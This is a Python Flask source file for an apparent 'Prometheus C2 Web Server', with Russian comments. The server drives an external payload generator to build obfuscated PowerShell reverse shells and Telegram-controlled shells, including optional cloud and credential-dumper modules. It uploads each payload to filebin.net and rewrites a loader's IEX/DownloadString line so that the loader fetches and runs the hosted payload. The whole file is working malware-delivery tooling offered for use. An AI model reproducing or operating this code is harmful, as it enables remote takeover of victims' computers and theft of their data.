#!/usr/bin/env python3
# web_server.py

import os
import subprocess
import requests
import json
import tempfile
import shutil
import uuid
from datetime import datetime
from flask import Flask, render_template, request, send_file, jsonify, flash, redirect, url_for
from werkzeug.utils import secure_filename
import ssl

app = Flask(__name__)
app.secret_key = 'prometheus_secret_key_2024'
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB max upload

# Конфигурация SSL
SSL_CERT = 'cert/server.crt'
SSL_KEY = 'cert/server.key'

# Цветовая схема (как вы просили)
COLORS = {
    'primary': '#d92525',    # Красный для декорации
    'secondary': '#403c3c',  # Серый для кнопок/полей
    'text': '#f5f2f2',       # Светлый для текста
    'gradient': 'linear-gradient(135deg, #d92525 0%, #403c3c 100%)'
}

# Проверяем существование сертификатов
if not os.path.exists(SSL_CERT) or not os.path.exists(SSL_KEY):
    print("[!] SSL certificates not found!")
    print("[*] Run: python create_cert.py to generate them")
    exit(1)

def run_pmtgener(payload_type, encryption_level, ip=None, port=None, token=None, chat_id=None, cloud_module=False, dumper_module=False):
    """Выполняет pmtgener с заданными параметрами"""
    try:
        # Создаем временную директорию для работы
        temp_dir = tempfile.mkdtemp(prefix='prometheus_')
        output_file = os.path.join(temp_dir, f"payload_{datetime.now().strftime('%H%M%S')}.ps1")
        
        # Формируем команду для pmtgener
        cmd = ['./pmtgener', '-t', payload_type, '-EL', str(encryption_level), '--output', output_file]
        
        # Добавляем специфичные параметры
        if payload_type in ['better_tg', 'tg_shell']:
            if token and chat_id:
                cmd.extend(['--token', token, '--id', chat_id])
            else:
                return None, "Telegram token and ID required for this payload"
            
            # Добавляем модули если выбраны
            if cloud_module:
                cmd.append('--cloud-module')
            if dumper_module:
                cmd.append('--dumper-module')
                
        elif payload_type in ['standart', 'advanced']:
            if ip and port:
                cmd.extend(['--ip', ip, '--port', str(port)])
            else:
                return None, "IP and port required for reverse shell"
        
        # Выполняем команду
        print(f"[*] Running: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True, cwd='.')
        
        if result.returncode != 0:
            return None, f"pmtgener error: {result.stderr}"
        
        # Проверяем, создан ли файл
        if os.path.exists(output_file):
            return output_file, None
        else:
            return None, "Payload file was not created"
            
    except Exception as e:
        return None, f"Exception: {str(e)}"

def upload_to_filebin(file_path):
    """
    Загружает файл на Filebin.net согласно API документации.
    Метод: POST
    URL: https://filebin.net{bin}/{filename}
    """
    try:
        if not os.path.exists(file_path):
            return None, "File not found"

        filename = os.path.basename(file_path)
        
        # 1. Генерируем уникальный идентификатор корзины (bin)
        bin_id = uuid.uuid4().hex[:16]
        
        # 2. Формируем URL согласно документации: https://filebin.net{bin}/{filename}
        upload_url = f"https://filebin.net/{bin_id}/{filename}"
        
        print(f"[*] Uploading {filename} to bin {bin_id}...")
        
        with open(file_path, 'rb') as f:
            response = requests.post(
                upload_url,
                data=f.read(),
                headers={
                    'User-Agent': 'PrometheusLoader/1.0',
                    'Content-Type': 'application/octet-stream'
                }
            )
        
        if response.status_code in [200, 201]:
            raw_url = f"https://filebin.net/{bin_id}/{filename}"
            print(f"[+] File uploaded successfully: {raw_url}")
            return raw_url, None
        else:
            return None, f"Upload failed (Status: {response.status_code}): {response.text}"
            
    except Exception as e:
        return None, f"Error: {str(e)}"

def update_loader_with_url(loader_file, download_url):
    """Обновляет txt файл загрузчика с новой ссылкой"""
    try:
        with open(loader_file, 'r') as f:
            content = f.read()
        
        if 'ENTERURLHERE' in content:
            new_content = content.replace('ENTERURLHERE', download_url)
        else:
            lines = content.split('\n')
            for i, line in enumerate(lines):
                if 'IEX' in line or 'DownloadString' in line or 'iwr' in line:
                    import re
                    url_pattern = r"['\"](https?://[^'\"]+)['\"]"
                    lines[i] = re.sub(url_pattern, f"'{download_url}'", line)
                    break
            new_content = '\n'.join(lines)
        
        updated_file = f"updated_{os.path.basename(loader_file)}"
        with open(updated_file, 'w') as f:
            f.write(new_content)
        
        return updated_file, None
        
    except Exception as e:
        return None, f"Error updating loader: {str(e)}"

def get_local_ip():
    """Получает локальный IP адрес"""
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

@app.route('/')
def index():
    """Главная страница"""
    local_ip = get_local_ip()
    return render_template('index.html', colors=COLORS, local_ip=local_ip)

@app.route('/generate', methods=['POST'])
def generate_payload():
    """Обработка формы генерации"""
    try:
        # Получаем данные из формы
        payload_type = request.form.get('payload_type')
        encryption_level = request.form.get('encryption_level', '5')
        
        # Telegram параметры
        token = request.form.get('telegram_token', '').strip()
        chat_id = request.form.get('chat_id', '').strip()
        
        # Reverse shell параметры
        ip = request.form.get('local_ip', '').strip()
        port = request.form.get('listener_port', '').strip()
        
        # Модули
        cloud_module = request.form.get('cloud_module') == 'on'
        dumper_module = request.form.get('dumper_module') == 'on'
        
        # Файл загрузчика
        loader_file = request.files.get('loader_file')
        
        # Валидация
        if not payload_type:
            return jsonify({'error': 'Please select payload type'}), 400
        
        # Проверка модулей (только для Telegram)
        if payload_type in ['standart', 'advanced'] and (cloud_module or dumper_module):
            return jsonify({'error': 'Modules are only available for Telegram payloads'}), 400
        
        # Проверка Telegram параметров для модулей
        if payload_type in ['better_tg', 'tg_shell'] and (cloud_module or dumper_module):
            if not token:
                return jsonify({'error': 'Telegram token required for modules'}), 400
            if not chat_id:
                return jsonify({'error': 'Chat ID required for modules'}), 400
        
        # Если IP не указан, пытаемся определить автоматически
        if payload_type in ['standart', 'advanced'] and not ip:
            ip = get_local_ip()
            print(f"[*] Auto-detected IP: {ip}")
        
        # Генерируем пейлоад
        print(f"[*] Generating {payload_type} payload with EL {encryption_level}...")
        if cloud_module:
            print("[*] Cloud module: ENABLED")
        if dumper_module:
            print("[*] Dumper module: ENABLED")
        
        output_file, error = run_pmtgener(
            payload_type, encryption_level, 
            ip or None, port or None, 
            token or None, chat_id or None,
            cloud_module, dumper_module
        )
        
        if error:
            return jsonify({'error': f'Generation failed: {error}'}), 500
        
        # Загружаем на Filebin
        download_url, upload_error = upload_to_filebin(output_file)
        if upload_error:
            if os.path.exists(output_file):
                os.remove(output_file)
                os.rmdir(os.path.dirname(output_file))
            return jsonify({'error': f'Upload failed: {upload_error}'}), 500
        
        # Обновляем файл загрузчика, если он был загружен
        loader_result = None
        if loader_file and loader_file.filename:
            loader_filename = secure_filename(loader_file.filename)
            loader_path = os.path.join('uploads', loader_filename)
            os.makedirs('uploads', exist_ok=True)
            loader_file.save(loader_path)
            
            updated_loader, loader_error = update_loader_with_url(loader_path, download_url)
            if not loader_error:
                loader_result = {
                    'filename': os.path.basename(updated_loader),
                    'path': updated_loader
                }
        
        # Очистка временного файла пейлоада
        if os.path.exists(output_file):
            os.remove(output_file)
            try:
                os.rmdir(os.path.dirname(output_file))
            except:
                pass
        
        # Формируем ответ
        response_data = {
            'success': True,
            'download_url': download_url,
            'payload_type': payload_type,
            'encryption_level': encryption_level,
            'modules': {
                'cloud': cloud_module,
                'dumper': dumper_module
            }
        }
        
        if loader_result:
            response_data['loader_file'] = loader_result['filename']
            response_data['loader_download'] = f"/download/{loader_result['filename']}"
        
        return jsonify(response_data)
        
    except Exception as e:
        return jsonify({'error': f'Server error: {str(e)}'}), 500

@app.route('/download/<filename>')
def download_file(filename):
    """Скачивание обновленного файла загрузчика"""
    try:
        file_path = os.path.join('.', f"updated_{filename}")
        if os.path.exists(file_path):
            return send_file(file_path, as_attachment=True)
        else:
            return jsonify({'error': 'File not found'}), 404
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/quick_generate', methods=['POST'])
def api_quick_generate():
    """API endpoint для быстрой генерации (для интеграции с другими скриптами)"""
    data = request.json
    payload_type = data.get('type', 'standart')
    encryption_level = data.get('el', '5')
    
    # Параметры модулей
    cloud_module = data.get('cloud_module', False)
    dumper_module = data.get('dumper_module', False)
    
    # Проверка модулей для API
    if payload_type in ['standart', 'advanced'] and (cloud_module or dumper_module):
        return jsonify({'error': 'Modules are only available for Telegram payloads'}), 400
    
    # Генерация
    output_file, error = run_pmtgener(
        payload_type, encryption_level,
        data.get('ip'), data.get('port'),
        data.get('token'), data.get('chat_id'),
        cloud_module, dumper_module
    )
    
    if error:
        return jsonify({'error': error}), 500
    
    # Возвращаем содержимое файла
    with open(output_file, 'r') as f:
        content = f.read()
    
    # Очистка
    if os.path.exists(output_file):
        os.remove(output_file)
        try:
            os.rmdir(os.path.dirname(output_file))
        except:
            pass
    
    return jsonify({
        'payload': content,
        'type': payload_type,
        'size': len(content),
        'modules': {
            'cloud': cloud_module,
            'dumper': dumper_module
        }
    })

def cleanup_temp_files():
    """Очистка временных файлов при запуске"""
    import glob
    for file in glob.glob("updated_*.txt"):
        try:
            os.remove(file)
        except:
            pass
    
    if os.path.exists('uploads'):
        shutil.rmtree('uploads', ignore_errors=True)
        os.makedirs('uploads', exist_ok=True)

if __name__ == '__main__':
    import argparse
    
    parser = argparse.ArgumentParser(description='Prometheus C2 Web Server')
    parser.add_argument('--port', type=int, default=8443, help='Port to run on (default: 8443)')
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind to (default: 0.0.0.0)')
    parser.add_argument('--no-ssl', action='store_true', help='Run without SSL (not recommended)')
    args = parser.parse_args()
    
    # Создаем необходимые директории
    os.makedirs('uploads', exist_ok=True)
    os.makedirs('templates', exist_ok=True)
    
    # Очищаем временные файлы
    cleanup_temp_files()
    
    # Сохраняем HTML шаблон если его нет
    template_path = os.path.join('templates', 'index.html')
    if not os.path.exists(template_path):
        print("[*] Creating index.html template...")
        # Здесь должен быть ваш HTML код
        # Для простоты можно сохранить отдельный файл
        
    if args.no_ssl:
        print(f"[!] WARNING: Running without SSL - INSECURE!")
        print(f"[*] Starting Prometheus C2 Web Server on http://{args.host}:{args.port}")
        app.run(host=args.host, port=args.port, debug=True, threaded=True)
    else:
        context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
        context.load_cert_chain(SSL_CERT, SSL_KEY)
        
        print(f"[*] Starting Prometheus C2 Web Server...")
        print(f"[*] Web Interface: https://{args.host}:{args.port}")
        print(f"[*] API Endpoint:  https://{args.host}:{args.port}/api/quick_generate")
        print(f"[!] Note: Your browser will warn about self-signed certificate.")
        print(f"[!] Click 'Advanced' -> 'Proceed to {args.host}' to continue.")
        
        app.run(
            host=args.host,
            port=args.port,
            ssl_context=context,
            debug=True,
            threaded=True
        )
